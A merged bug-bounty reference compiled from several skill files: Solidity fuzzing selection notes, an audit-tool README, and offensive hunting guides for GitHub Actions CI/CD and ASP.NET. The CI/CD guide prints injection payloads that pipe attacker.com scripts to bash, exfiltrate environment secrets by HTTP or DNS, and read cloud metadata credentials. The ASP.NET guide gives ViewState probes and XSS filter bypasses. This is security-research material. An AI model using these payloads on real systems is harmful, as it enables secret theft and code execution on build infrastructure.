# MERGED SOURCE KNOWLEDGE: misconfiguration

526 unique sections from 14 source files. Each section appears in exactly one target.


## SOURCE: hunt-skills/bountyforge/skills/fizz/references/selection-policy.md

# Entry-Point Selection Policy

Use this policy when creating the initial `entry-point-selection.json`.

## Goal

Select the smallest handler surface that still exercises the protocol's real state machine.

## Prefer By Default

- core user flows such as `deposit`, `withdraw`, `mint`, `redeem`, `borrow`, `repay`, `stake`, `unstake`, `swap`, `claim`
- recurring permissioned flows such as `harvest`, `liquidate`, `rollover`, `notifyRewardAmount`, `rebalance`, `settle`
- edge-case actions that plausibly break accounting, mode transitions, or fund safety

## Exclude By Default

- `view` and `pure` functions
- one-time migration and bootstrap functions
- internal plumbing exposed as `external` only for contract-to-contract calls
- routine parameter setters that mostly tune config without creating meaningful state-machine pressure

## Include Carefully

Keep a permissioned or config-like action when one of these is true:

- it changes fund routing, fee accounting, caps, oracle state, or collateral rules
- it toggles pause, shutdown, or mode flags
- sequencing it against user flows is plausibly dangerous
- it is part of normal operations for keepers, liquidators, or reward distributors

## Decision Heuristics

For each candidate function, ask:

1. Would a real user, admin, keeper, operator, or liquidator call this directly?
2. Does this function create or unlock important state transitions?
3. Would omitting it make the fuzz campaign miss an important lifecycle edge?
4. Is it mostly internal wiring that should instead be exercised indirectly through another entry point?

If confidence is low, prefer excluding protocol-internal plumbing and keeping the higher-signal external flows.

## Tier Classification

After selection, classify each included function as **primary** or **secondary**:

- **Primary**: core user flows that the fuzzer should call frequently (deposit, withdraw, mint, redeem, borrow, repay, swap, stake, unstake, claim, liquidate, etc.)
- **Secondary**: less common functions that are still useful but should be called less often (admin setters, configuration changes, pause/unpause, role grants, parameter tuning, etc.)

Secondary functions are grouped into a dispatcher handler in Step 7, reducing their call frequency without excluding them entirely.


## SOURCE: hunt-skills/bountyforge/skills/fizz/templates/README.md

## What Is Here

- `Base.sol`: shared setup, deployed contract references, actors, helpers, and ghost state
- `Snapshots.sol`: before/after state capture used by properties
- `Properties.sol`: global and function-specific invariants
- `handlers/`: protocol actions exposed to the fuzzers
- `harness/`: (optional) harness contracts that inherit from target contracts to expose private/internal state needed by properties
- `utils/`: shared helper libraries, assertions, clamping logic, math helpers, deploy helpers, logging, and mocks
- `FuzzTester.sol`: main Echidna/Medusa fuzzing entry point
- `FoundryTester.sol`: Foundry harness for quick debugging and local repros

## Related Paths Outside This Directory

- `../../fizz_data/`: extracted ABI inventory, entry-point selection, protocol-understanding notes, corpora, logs, and coverage outputs
- `../../echidna.yaml`: Echidna config
- `../../medusa.json`: Medusa config

## How To Run

From the project root:

```bash
forge build
forge test --match-contract FoundryTester
echidna . --contract FuzzTester --config echidna.yaml
medusa fuzz --config medusa.json
```

## How To Read The Suite

Recommended order:

1. `README.md`
2. `Base.sol`
3. `handlers/Handlers.sol`
4. individual handler files under `handlers/`
5. `Snapshots.sol`
6. `Properties.sol`
7. `harness/` (if present) — to understand what private/internal state is exposed and why
8. `utils/` when you need to understand helper behavior or mocks
9. `FuzzTester.sol`
10. `FoundryTester.sol`


## SOURCE: hunt-skills/bountyforge/skills/pashov/x-ray/README.md

# X-Ray

Know your protocol before auditors do.

Built for:

- **Protocol teams** preparing for an audit — fix the obvious so auditors can focus on what matters
- **Security researchers** starting a new engagement — get the full picture in minutes

Not a vulnerability scanner — it's the briefing you read before opening the first file.

## What You Get

One command produces:

| Output | What's Inside |
|--------|--------------|
| `x-ray.md` | Protocol overview, threat model, test gaps, git history, readiness verdict |
| `entry-points.md` | Every state-changing function classified by access level with call chains |
| `invariants.md` | Full invariant map — enforced guards, single-contract invariants, cross-contract trust assumptions, and higher-order economic properties |
| `architecture.svg` | Visual architecture diagram — contracts, actors, trust boundaries |

## Demo

_Part of an X-Ray report generation shown below_

![Running x-ray in terminal](../static/x_ray.gif)

## Usage

```
Install latest https://github.com/pashov/skills/ and run x-ray on the codebase
```

## Tips

- **Start with the verdict.** The report ends with a tier (FORTIFIED → EXPOSED) and 3-5 action items. If you only read one section, read that.
- **Use entry-points.md as your map.** Start with permissionless functions — those are the highest-risk surface.
- **Check the action items.** The final section highlights concrete next steps — whether you're preparing for an audit or starting one.


## SOURCE: hunt-skills/cicd-security/SKILL.md

# CI/CD SECURITY — Pipeline Attack Surface

> CI/CD pipelines are high-value targets — a single workflow injection can give you code execution on the build server, read ALL org secrets, and push backdoored releases to production.

---

## 0. QUICK KILL CHECKLIST

```
[ ] Run cicd_scanner.sh <owner/repo> — catch low-hanging workflow lint issues
[ ] Check for script injection: ${{ github.event.*.body/title/name }}
[ ] Find secrets referenced in env: — test if they leak in logs
[ ] Check pull_request_target with checkout of untrusted code
[ ] Look for self-hosted runners on public repos
[ ] Search for OIDC token requests without audience restriction
[ ] Check for unpinned actions (uses: owner/action@main)
[ ] Look for workflow_dispatch with no input validation
[ ] Find artifact downloads without integrity checks
[ ] Search for GITHUB_TOKEN with write permission used insecurely
```

---

# Org-wide (up to 30 repos)
bash tools/cicd_scanner.sh "org:orgname" --limit 50 --parallel 5

# Scan with recursive reusable workflow analysis
bash tools/cicd_scanner.sh owner/repo --recursive --depth 5

# Custom output
bash tools/cicd_scanner.sh owner/repo --output-dir ./findings/target/cicd
```

**Output:** `findings/<target>/cicd/scan_results.txt` + `summary.txt`

**What sisakulint finds:**
- Script injection via untrusted context
- Unpinned actions (tag instead of SHA)
- `pull_request_target` misuse
- Dangerous patterns (`eval`, `curl | bash`, etc.)
- Exposed secret names in `run:` blocks

---

### What It Is
GitHub Actions exposes PR/issue data as context variables. If injected into a `run:` block without sanitization, an attacker controls shell code.

# VULNERABLE — attacker controls pr.title
- name: Print PR title
  run: echo "Title: ${{ github.event.pull_request.title }}"
  # Attacker PR title: "; curl attacker.com/shell.sh | bash #"
```

# SAFE — pass through env var, never interpolate directly
- name: Print PR title
  env:
    PR_TITLE: ${{ github.event.pull_request.title }}
  run: echo "Title: $PR_TITLE"
```

### Injectable Contexts (always check these)
```
github.event.pull_request.title
github.event.pull_request.body
github.event.pull_request.head.ref        ← branch names
github.event.issue.title
github.event.issue.body
github.event.comment.body
github.event.review.body
github.event.review_comment.body
github.event.discussion.title
github.event.discussion.body
github.head_ref                            ← alias for branch name
github.event.inputs.*                      ← workflow_dispatch inputs
```

# PR title / issue title payload:
"; wget -q -O- attacker.com/$(cat /etc/hostname | base64) #
```

# Find injectable patterns in .github/workflows/
grep -rn '\${{.*github\.event\.\(pull_request\|issue\|comment\|review\|discussion\)' .github/workflows/
grep -rn '\${{.*github\.head_ref' .github/workflows/
grep -rn '\${{.*github\.event\.inputs' .github/workflows/
```

---

### What It Is
`pull_request_target` runs in the context of the BASE repo (has secrets) but can be tricked into checking out and running attacker code.

### Vulnerable Pattern
```yaml
on: pull_request_target

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
        with:
          ref: ${{ github.event.pull_request.head.sha }}  # ← attacker code!
      - run: npm test  # runs attacker's package.json scripts
```

### Why It's Critical
- `pull_request_target` has access to secrets
- Checkout uses the PR's code
- Any `run:` step executes attacker-controlled code with access to all org secrets

# Then check if the same job does a checkout of the PR head
grep -A 20 'pull_request_target' .github/workflows/*.yml | grep -E '(head\.sha|head_ref|checkout)'
```

---

# Search for secrets echoed in run: blocks
grep -rn 'echo.*secrets\.' .github/workflows/
grep -rn 'cat.*secrets\.' .github/workflows/
grep -rn 'env.*secrets\.' .github/workflows/ | grep -v '^#'
```

### GITHUB_TOKEN Abuse
The auto-generated `GITHUB_TOKEN` can be used to:
- Push code to branches
- Create releases
- Read all private repo content
- Approve PRs (if permissions allow)

```yaml

# Check for overly broad permissions
permissions:
  contents: write    # ← Can push/delete code
  packages: write    # ← Can push malicious packages
  pull-requests: write
```

# In an injected run: block
curl "https://attacker.com/?d=$(printenv | base64 -w0)"

# Or via DNS (more stealthy)
nslookup "$(printenv SECRET | md5sum | cut -c1-20).attacker.com"
```

---

### Why It Matters
Public repos with self-hosted runners allow ANY fork to queue jobs on internal machines.

# Pull triggers that run on self-hosted
grep -B5 'self-hosted' .github/workflows/*.yml | grep -E '(pull_request|push)'
```

### Exploit Path
1. Fork public repo that uses self-hosted runners
2. Open PR with malicious workflow step
3. Job runs on internal self-hosted runner
4. Access internal network, read instance metadata, exfil secrets

# Attacker adds to fork:
jobs:
  pwn:
    runs-on: self-hosted
    steps:
      - name: Recon
        run: |
          curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ \
            | xargs -I{} curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/{}
```

---

### What It Is
GitHub Actions can request short-lived cloud credentials via OIDC. Misconfigured trust policies allow any branch/repo to claim elevated AWS/GCP/Azure roles.

# Find OIDC usage
grep -rn 'id-token.*write\|configure-aws-credentials\|google-github-actions\|azure/login' .github/workflows/
```

### Exploit: Overly Broad AWS Trust Policy
```json
{
  "Condition": {
    "StringEquals": {
      "token.actions.githubusercontent.com:aud": "sts.amazonaws.com",
      "token.actions.githubusercontent.com:sub": "repo:org/*:*"
    }
  }
}
```
→ Any branch in the org can assume this role.

### What to Check
```
1. What role does the workflow assume? (aws:role: ARN in workflow or secrets)
2. Is the trust policy scoped to a specific branch? (ref:refs/heads/main)
3. Can you trigger this from a fork or feature branch?
4. What permissions does the role have?
```

---

# VULNERABLE — could be hijacked if maintainer's account is compromised
uses: actions/checkout@v3

# SAFE — pinned to a specific commit SHA
uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683
```

### Dependency Confusion Attack
1. Find `package.json` or `requirements.txt` that references internal packages
2. Check if the internal package name is published on npm/PyPI
3. Publish a malicious package with a higher version number
4. Build server installs the public (malicious) one instead

# Find internal package names in config files
grep -rn '"registry"' package.json .npmrc
grep -rn 'index-url\|extra-index-url' requirements.txt pip.conf setup.py

## 8. BUG CLASS TABLE

| Bug | Trigger | Severity | CVSS Range |
|-----|---------|----------|-----------|
| Workflow injection via PR title | `${{ github.event.pull_request.title }}` in `run:` | Critical | 9.0–10.0 |
| `pull_request_target` + checkout | Accepts PRs from forks | Critical | 9.0–10.0 |
| Self-hosted runner on public repo | `runs-on: self-hosted` + public repo | High | 7.5–9.0 |
| OIDC trust too broad | Any-branch/any-repo claim | High | 7.5–8.5 |
| Secret in log | `echo ${{ secrets.X }}` | Medium | 5.5–7.0 |
| Unpinned action | `@main` / `@v1` tag | Low–Medium | 3.0–5.5 |
| Artifact poisoning | Unsigned artifact download + exec | Medium | 5.5–7.0 |
| `GITHUB_TOKEN` write abuse | Push to protected branch | Medium | 5.5–7.0 |
| Dependency confusion | Internal pkg not on public registry | High | 7.5–9.0 |
| `workflow_dispatch` injection | Unvalidated inputs in `run:` | Medium–High | 6.0–8.0 |

---

### Chain A: IDOR → CI/CD Secret Read
```
1. IDOR on /api/repos/{id}/settings → read CI/CD config
2. Config references internal secret names
3. Workflow injection to exfil those secrets
→ Impact: Full org secret exfiltration
```

### Chain B: XSS → GitHub Token Theft
```
1. Stored XSS on internal GitHub Enterprise
2. JS payload reads document.cookie / localStorage for GITHUB_TOKEN
3. Token used to trigger workflow with malicious inputs
→ Impact: RCE on build infrastructure
```

### Chain C: Supply Chain → Production Push
```
1. Find unpinned action (e.g., uses: corp/internal-action@main)
2. Fork or compromise corp/internal-action
3. Merge malicious code
4. Next CI run pulls the compromised action with full repo write access
→ Impact: Code execution, backdoored releases
```

---

## Summary
GitHub Actions workflow in `<repo>` is vulnerable to **workflow injection** via the
`github.event.pull_request.title` context variable, which is interpolated directly
into a `run:` shell block. An attacker who opens a specially crafted PR can achieve
arbitrary code execution on the build runner with full access to all repository secrets.

## Steps to Reproduce
1. Fork `<repo>`
2. Open a PR with the following title:
   `"; curl -s attacker.com/$(cat /etc/hostname | base64 -w0 | head -c 40) #`
3. The CI workflow `.github/workflows/<name>.yml` runs and executes the injected command.
4. Observe DNS/HTTP callback to attacker.com with hostname (or secret payload).

## Impact
- RCE on build runner
- Read of all `${{ secrets.* }}` available to the workflow
- Ability to push malicious code to repository or publish backdoored packages
- Pivot to internal network if runner is self-hosted

## Remediation
Replace direct context interpolation with environment variable assignment:
env:
  PR_TITLE: ${{ github.event.pull_request.title }}
run: echo "$PR_TITLE"

## 11. SCOPE NOTES

- Most bug bounty programs scope **public** repos only — confirm before touching private org repos.
- Self-hosted runner attacks require a successful workflow run, which means opening a real PR — confirm the program allows this.
- Never trigger a workflow that could affect production infrastructure without explicit written permission.
- Always check `SECURITY.md` or the program policy for CI/CD-specific scope language.

---

## 12. TOOLS REFERENCE

| Tool | Purpose | Install |
|------|---------|---------|
| `sisakulint` | Lint GitHub Actions workflows for security issues | `bash install_tools.sh` |
| `trufflehog` | Find secrets leaked in git history / workflow logs | `bash install_tools.sh` |
| `gitleaks` | Scan repos for hardcoded secrets | `bash install_tools.sh` |
| `gh` CLI | Download workflow logs, list secrets, trigger runs | `brew install gh` |
| `nuclei` | CI/CD-specific templates | `-tags cicd` |
| `secrets_hunter.sh` | Wrapper for all three secret scanners | `bash tools/secrets_hunter.sh` |

```bash

# Download public workflow run logs (no auth needed)
gh run list --repo owner/repo --limit 10
gh run view <run-id> --log --repo owner/repo

# List exposed secret names (names only — values never shown by API)
gh secret list --repo owner/repo
```


## SOURCE: hunt-skills/hunt-aspnet/SKILL.md

## Crown Jewel Targets

ASP.NET deserialization bugs pay among the highest amounts in bug bounty when they reach RCE. Even when patched, the disclosure-tier findings (signed-only ViewState, dual-parser differential, request-validator quirks) reliably pay Low-Medium.

**Highest-value targets:**

- **SharePoint farms** (any version — 2013/2016/2019/SE) — sign-only ViewState + permissive ToolPane.aspx + anonymous FormDigest creates the CVE-2025-53770 ToolShell precondition chain
- **Telerik UI for ASP.NET AJAX** — `Telerik.Web.UI.WebResource.axd` is a documented RCE sink when keys leak (CVE-2017-11317, CVE-2017-11357, CVE-2019-18935)
- **Classic ASP.NET Webforms enterprise apps** — banking portals, dealer portals, HR systems left on .NET Framework 4.x
- **WCF services** (`*.svc?WSDL`) — often forgotten admin endpoints with looser auth than the main app
- **Sitecore CMS** — ViewState + Sitecore-specific deserialization chains (CVE-2021-42237)
- **DotNetNuke (DNN)** — historic ViewState RCE chains
- **Umbraco CMS** — ViewState + custom deserialization sinks

**Asset types that pay most:** internet-reachable ASP.NET Webforms apps > WCF admin services > Telerik-integrated sites > Classic ASP.NET MVC with VSF (very rare)

---

## Attack Surface Signals

**Response headers indicating ASP.NET:**
```
X-AspNet-Version: 4.0.30319          (classic — disclosure on its own)
X-Powered-By: ASP.NET
X-AspNetMvc-Version: 5.2
Server: Microsoft-IIS/10.0
Set-Cookie: ASP.NET_SessionId=...
Set-Cookie: .ASPXAUTH=...            (Forms auth cookie)
Set-Cookie: .ASPXFORMSAUTH=...
Set-Cookie: ASP.NET_SessionId=...; SameSite=None  (suggests cross-origin embedding)
```

**Body signals (in form HTML):**
```
<input type="hidden" name="__VIEWSTATE" id="__VIEWSTATE" value="..." />
<input type="hidden" name="__VIEWSTATEGENERATOR" id="__VIEWSTATEGENERATOR" value="..." />
<input type="hidden" name="__VIEWSTATEENCRYPTED" id="__VIEWSTATEENCRYPTED" value="" />
                                        ↑ EMPTY = signed-only, not encrypted = exploitable if key leaks
<input type="hidden" name="__EVENTVALIDATION" id="__EVENTVALIDATION" value="..." />
<input type="hidden" name="__REQUESTDIGEST" id="__REQUESTDIGEST" value="0x...,...">
                                        ↑ SharePoint CSRF token; if anon-issued, see hunt-sharepoint
```

**URL patterns to probe:**
```
/trace.axd                            (per-app trace viewer; sometimes anon-accessible)
/elmah.axd                            (ELMAH error log viewer)
/elmah.axd/?id=...                    (ELMAH RCE / stack-trace leak)
/*.svc                                (WCF services)
/*.svc?wsdl                           (WCF WSDL)
/*.svc/mex                            (Metadata Exchange)
/*.asmx                               (legacy SOAP)
/*.asmx?WSDL                          (legacy SOAP description)
/*.asmx?disco                         (legacy discovery)
/Telerik.Web.UI.WebResource.axd       (Telerik AJAX components)
/ChartImg.axd                         (DataVisualization controls; historic deserialization)
/ScriptResource.axd                   (script resource handler; sometimes leaks paths)
/WebResource.axd                      (web resource handler)
/_vti_bin/*                           (SharePoint Web Service Forwarder)
/api/                                 (Web API 2.x is ASP.NET on classic framework)
/signin                               (often FedAuth / WS-Federation)
```

**Tech-stack signals:**
- `Server: Microsoft-IIS/10.0` (or `/8.5`, `/7.5`) — confirmed Windows + IIS
- `X-AspNet-Version` header — classic .NET Framework (4.x); .NET Core/5+ does NOT emit this
- Cookies with `ASP.NET_SessionId`, `.ASPXAUTH`, `FedAuth` — Forms or claims auth
- `__VIEWSTATE` in form bodies — Webforms (NOT MVC, NOT Razor Pages, NOT Blazor)
- `MicrosoftSharePointTeamServices` header (sometimes stripped by ELB but leaks in `start.aspx` body) — SharePoint

---

## Step-by-Step Hunting Methodology

1. **Fingerprint the framework version.** Trigger any 500 error (stale ViewState POST is a reliable way) and look for `Version Information: Microsoft .NET Framework Version:X.X.XXXXX; ASP.NET Version:X.X.XXXX.X` in the error body. This banner discloses both the runtime and ASP.NET-version-specific patch level. .NET 4.0.30319 + ASP.NET 4.8.x is the most common modern combination.

2. **Locate every form with `__VIEWSTATE`.** Spider the target and grep for `name="__VIEWSTATE"`. Each is a candidate sink for deserialization attacks if MAC / encryption is bypassable.

3. **Check `__VIEWSTATEENCRYPTED` value.** Empty (`value=""`) means ViewState is signed-only via `<machineKey>` but NOT encrypted. Recovery of the validation key → arbitrary deserialization. Non-empty (`value="something"`) means ViewState is BOTH signed and encrypted; both keys needed to forge.

4. **Test the ViewState parser-error differential** (the dual-parser anti-pattern). Send 7+ ViewState shapes and classify responses:
   - Trivial garbage (`AAAA`) → `"Validation of viewstate MAC failed"`
   - Real prefix from current page → `"Validation of viewstate MAC failed"`
   - Flipped-bit real ViewState → `"Validation of viewstate MAC failed"`
   - Oversize (`A * 100000`) → `"Validation of viewstate MAC failed"`
   - XML-shaped (`<xss/>`) → **"The state information is invalid for this page and might be corrupted"** ← different parser path
   - LosFormatter-style prefix (`/wEPDwUKMTcxNzgyOTQwMmRkkz9p4lzA...`) → **"The state information is invalid for this page and might be corrupted"**

   The differential proves there are **two distinct deserialization entry points**, one of which dispatches BEFORE the MAC check on some payload shapes. Historically this enables MAC-before-parse-bypass exploits.

5. **Look for load-balanced cross-node ViewState MAC failures.** If POST gets a 500 with `"Validation of viewstate MAC failed. If this application is hosted by a Web Farm or cluster, ensure that <machineKey> configuration specifies the same validationKey..."`, the farm has multiple WFEs WITHOUT machineKey sync, or without sticky-session affinity. Operationally this breaks legit users; security-wise it confirms farm topology.

6. **Probe `trace.axd` and `elmah.axd`.** If either returns 200 anonymously, it's a Critical finding (trace leaks every request + headers + form data; ELMAH leaks every server error including stack traces).

7. **Enumerate WCF services (`.svc`).** For each, fetch `?wsdl` and `?mex` (metadata exchange). MEX endpoints sometimes return full service contracts including admin operations.

8. **Test request-validator bypass.** ASP.NET's request validator blocks `<` in query strings by default. Bypass categories that may still get through:
   - HTML-entity-encoded payloads (`&lt;script&gt;` — but these don't execute)
   - Encoded inside JSON / XML POST bodies (different content-type ≠ same validator)
   - In path segments (not query) — validator scope depends on framework version
   - In Cookie / Referer headers (varies)
   - Inside `<%@ ... %>` ASP directives if reached via WebDAV PUT (rare)

9. **Check `customErrors` mode.** If 500s expose full stack traces, framework versions, file paths, internal method names → `customErrors mode="Off"` is set. Should be `RemoteOnly` for production.

10. **Look for Telerik components.** `Telerik.Web.UI.WebResource.axd?type=rau` is the historic upload-to-RCE chain (CVE-2017-11317). The `dialogParametersHolder` parameter chain (CVE-2019-18935) requires the encryption key but is otherwise RCE.

11. **SharePoint-specific deserialization paths** — see `hunt-sharepoint` skill for the ToolPane.aspx + anonymous FormDigest + unencrypted ViewState chain.

12. **SafeControl enumeration via reflection.** SharePoint's `Picker.aspx?PickerDialogType=<TypeName>` (and DNN-equivalent endpoints) accept class names and return DIFFERENT error messages for "type exists but not whitelisted" vs "type does not exist." Feed a wordlist of `Microsoft.SharePoint.*.WebControls.*` types to enumerate the SafeControl list — useful for CVE-2019-0604-family hunting.

---

## Payload & Detection Patterns

**Stack-trace fingerprint (trigger via stale ViewState POST):**
```bash
curl -sk -X POST "https://target.example/page.aspx" \
  --data "__VIEWSTATE=AAAA&__VIEWSTATEGENERATOR=AAAA"

#  - "The state information is invalid for this page" → confirms ALTERNATE parser path

#  - "Version Information: Microsoft .NET Framework Version:X.X.XXXXX" → exact patch level

#  - "Microsoft.SharePoint.Client.ServerStub..." → SharePoint farm
```

**ViewState parser-error differential probe (Python):**
```python
import requests, re, json
S = requests.Session(); S.verify = False

# Get fresh form
r = S.get("https://target.example/path/page.aspx")
real_vs = re.search(r'__VIEWSTATE" id="__VIEWSTATE" value="([^"]+)', r.text).group(1)
real_vsg = re.search(r'__VIEWSTATEGENERATOR" id="__VIEWSTATEGENERATOR" value="([^"]+)', r.text).group(1)

# Test 7 payload shapes
for label, vs in [
    ("trivial",      "AAAA"),
    ("real",         real_vs),
    ("flipped-bit",  real_vs[:50] + "X" + real_vs[51:]),
    ("oversize",     "A" * 100000),
    ("base64",       "VGVzdE1hcmtlcjY3OFhZWg=="),
    ("xml-shaped",   "<xss/>"),
    ("losformatter", "/wEPDwUKMTcxNzgyOTQwMmRkkz9p4lzA" + "A"*50),
]:
    r = S.post("https://target.example/path/page.aspx",
               data={"__VIEWSTATE": vs, "__VIEWSTATEGENERATOR": real_vsg})
    title = re.search(r'<title>([^<]+)</title>', r.text)
    title = title.group(1)[:100] if title else "—"
    print(f"  [{label:14s}] {r.status_code}  {title}")
```

**`trace.axd` anonymous check:**
```bash
curl -sk -o /dev/null -w "%{http_code}\n" "https://target.example/trace.axd"

# 403 = mod set to localhost-only → check via X-Forwarded-For: 127.0.0.1
```

**WCF service enumeration:**
```bash

# Find all .svc files
curl -sk "https://target.example/" -o body.html
grep -oE '/[a-zA-Z0-9/_-]+\.svc' body.html | sort -u

# For each found:
curl -sk "https://target.example/Service.svc?wsdl" | xmllint --format - | head -60
```

**Request-validator bypass categories:**
```

# Default: <script>alert(1)</script> in ?q= → "Potentially dangerous Request.QueryString value detected"

# Bypasses that sometimes work:
?q=%3cscript%3e            (URL-encoded — depends on validator config)
?q=<svg/onload=alert(1)>  (depends on validator version)
?q=<%00script>             (NUL-byte; older validators)
?q=javascript:alert(1)     (no < at all — passes validator)
Cookie: foo=<script>       (cookie body not validated by default)
Referer: http://x.com/<script>  (referer not validated in classic ASP.NET)
```

**Telerik exploit gate (CVE-2019-18935 — requires encryption keys):**
```bash

# Fingerprint Telerik
curl -sk "https://target.example/Telerik.Web.UI.WebResource.axd?type=rau" -X POST

## Common Root Causes

1. **`viewStateEncryption="Auto"` defaults to signed-only on pages without sensitive ViewState data.** Many SharePoint pages are configured this way. When `__VIEWSTATEENCRYPTED` is empty, ViewState is signed-only — recovery of `validationKey` alone enables forgery.

2. **`<machineKey>` AutoGenerate in a Web Farm.** Each WFE generates a different key on first boot; ViewState issued by one WFE fails MAC validation on another. Operationally produces 500s; security-wise broadcasts the topology (the error message names the cluster).

3. **`<customErrors mode="Off">` left from development.** Stack traces with full method names, file paths, version banners exposed to anonymous internet users.

4. **`trace.axd` / `elmah.axd` left enabled in production.** Often forgotten in `<system.web><trace enabled="true">` blocks.

5. **Forgotten WCF `.svc` admin endpoints.** Built for internal admin tooling, never disabled when the main app went to internet exposure.

6. **Dual-parser anti-pattern: `ObjectStateFormatter` (legacy) vs `LosFormatter` (modern) deserialize in different orders relative to MAC validation.** Some payload shapes hit the legacy parser BEFORE MAC check.

7. **Request validator only applies to URL-encoded body and querystring.** Headers, cookies, XML/JSON bodies, and multipart fields are NOT validated by default. Developers assume validator is universal; it is not.

8. **`<machineKey>` checked into source repos.** Configuration check-ins to GitHub frequently leak validation/decryption keys. Combine with `hunt-misc` source-recon for Telerik / SharePoint / DNN keys.

9. **`SafeControls` web.config entries trusted to gate deserialization.** SharePoint's `<SafeControl>` list determines which classes Picker.aspx can instantiate. Bypasses exist when the inheritance check is the only gate (CVE-2019-0604 family).

---

## Bypass Techniques

| Defense | Bypass |
|---|---|
| `__VIEWSTATEENCRYPTED` non-empty (encrypted) | Recover both decryption + validation keys from any source-code leak / config-disclosure / VS forge primitive; without keys, deserialization cannot be triggered |
| Request validator blocks `<` in querystring | Move payload to Cookie / Referer / JSON body / multipart filename — validator doesn't reach those contexts in classic ASP.NET |
| `EnableViewStateMac="true"` enforced | Recover `validationKey` from web.config disclosure or `<machineKey>` AutoGenerate fingerprinting (ysoserial.net `--minify --islegacy` mode generates ViewState that passes some MAC-validation gaps) |
| `trace.axd` localhost-only | Set `X-Forwarded-For: 127.0.0.1` if the trace mode is `localOnly` and the validation uses Request.UserHostAddress (some apps use Forwarded-For instead) |
| WCF `.svc` 401 on anonymous | Try `?wsdl` and `?mex` first; metadata is sometimes anonymously enumerable even when service ops require auth |
| Telerik upload patched | Check the Telerik version: anything pre-2017Q1 (build 2017.1.118 or earlier) is the original RAU RCE. Check 2017Q3 - 2019Q3 for CVE-2019-18935 |
| `SafeControl` whitelist enforced | Inheritance gate (`instanceof PickerDialog`) IS the gate on patched SP — bypass requires finding a SafeControl subclass with a deserialization sink; enumerate via Picker.aspx |
| `customErrors mode="On"` (no stack traces) | Force a different error path: invalid Content-Length, malformed ViewState that triggers a parser-level exception below the customErrors handler |

---

## Gate 0 Validation

Before writing the report, confirm:

1. **What can the attacker DO right now with the disclosed information?**
   - `trace.axd` 200 with full request dump → **Critical** (PII / session cookies / Authorization headers exposed)
   - `elmah.axd` 200 with error log → **High** (stack traces + internal paths + sometimes credentials)
   - `__VIEWSTATEENCRYPTED` empty + recoverable machineKey via separate finding → **Critical chain to RCE**
   - `__VIEWSTATEENCRYPTED` empty without key recovery → **Low-Medium** (primitive present, not exploitable on its own)
   - Stack traces in 500s → **Low** unless they include credentials / connection strings

2. **Have you reproduced the full chain to attacker-attainable impact, or only the primitive?**
   - Cross-reference `triage-validation` Pre-Severity Gate. "Primitive confirmed" is not Critical until the chain ends in impact.

3. **Can a triager reproduce in <10 min from your report?**
   - Each step copy-pasteable curl / Python.
   - For RCE chains: link the public exploit tool (ysoserial.net, viewgen, telerik-revda) and the specific gadget chain.

---

### Scenario A — Signed-only ViewState + permissive ToolPane on EoL SharePoint 2013

`https://target-portal.example/_layouts/15/ToolPane.aspx?DisplayMode=Edit` returns 200 anonymously. The form contains `__VIEWSTATE` (signed only — `__VIEWSTATEENCRYPTED=""`), and `__REQUESTDIGEST` is anonymously issued via `_api/contextinfo`. Combined with SP2013 being end-of-life (no patch will ever ship), this is the canonical CVE-2025-53770 "ToolShell" precondition chain on a permanently-unpatched code path. Reported severity: **Critical**. The dual-parser test (Section 4 of Methodology) confirmed that XML-shaped payloads reach the legacy `ObjectStateFormatter` BEFORE MAC validation — additional evidence that the chain is reachable even without full machineKey recovery (though full RCE requires both).

### Scenario B — Telerik RadAsyncUploadHandler exposed on legacy bank portal

`/Telerik.Web.UI.WebResource.axd?type=rau` returns the Telerik upload handler. Telerik version (visible in JS bundle metadata) is 2016.3.1027. CVE-2017-11317 applies — keys are baked into the public Telerik DLL of that version. Upload → write `aspx` to `/app_data/` → request → RCE. Reported severity: **Critical**.

### Scenario C — trace.axd + elmah.axd both exposed on enterprise HR portal

`trace.axd` 200 returns 50 most recent requests, including `Authorization: Bearer eyJ...` headers on API requests. `elmah.axd` 200 returns full error log with database connection-string in one of the exceptions. Reported severity: **Critical** (credentials in plaintext to anonymous internet).

---

## Related Skills & Chains

- **`hunt-rce`** — ViewState deserialization is the headline ASP.NET RCE path; signed-only ViewState + leaked machineKey = RCE every time. Chain primitive: ASP.NET ViewState dual-parser MAC-bypass anti-pattern detected (signed but not encrypted, `<%@ Page enableViewStateMac="true" viewStateEncryptionMode="Never" %>`) + machineKey recovered (from web.config disclosure, `elmah.axd`, source leak, or GitHub) → `hunt-rce` ysoserial.net `TypeConfuseDelegate` gadget → arbitrary command in `w3wp.exe` worker-process identity.
- **`hunt-sharepoint`** — SharePoint farms inherit every ASP.NET anti-pattern plus their own surface. Chain primitive: ASP.NET fingerprint reveals SharePoint (X-SharePoint headers + `/_layouts/` reachable) → pivot to `hunt-sharepoint` for SP-specific RCE paths (ToolShell, SafeControl reflection) before generic ViewState attack.
- **`hunt-ntlm-info`** — IIS sites that advertise NTLM/Negotiate anonymously leak AD topology. Chain primitive: ASP.NET app behind IIS with `WWW-Authenticate: NTLM` → `hunt-ntlm-info` Type-2 challenge capture → internal forest name → cross-reference Entra tenant via `m365-entra-attack` discovery.
- **`hunt-file-upload`** — Telerik RadAsyncUpload, Kentico, Umbraco, and DotNetNuke all have historical upload-handler RCE. Chain primitive: ASP.NET CMS fingerprinted → `hunt-file-upload` bypass matrix against the CMS upload handler → `.aspx` written into web-accessible path → request → RCE under app-pool identity.
- **`triage-validation`** — `trace.axd`/`elmah.axd` disclosure is only Critical when it actually leaks live credentials/tokens; pure stack traces are usually Low. Chain primitive: pull every reported finding through `triage-validation` 7-Question Gate before submission — distinguish "verbose error" (informational) from "live bearer token in error log" (Critical) before writing the report (`redteam-report-template`).


## SOURCE: hunt-skills/hunt-cicd/SKILL.md

## Crown Jewel Targets

Jenkins `/script` console reachable = immediate RCE. A GitHub Actions `pull_request_target` (or `workflow_run`) workflow that checks out the **PR head ref** and references untrusted `${{ github.event.* }}` in a shell `run:` = "Pwnrequest" → secret exfil from a fork PR with zero approval.

**Highest-value findings:**
- **Jenkins Script Console** — Groovy execution → full RCE → dump the credential store
- **Jenkins CLI file read (CVE-2024-23897)** — pre-auth `@/etc/passwd` arg expansion → read `secret.key`/`credentials.xml` → forge admin → RCE
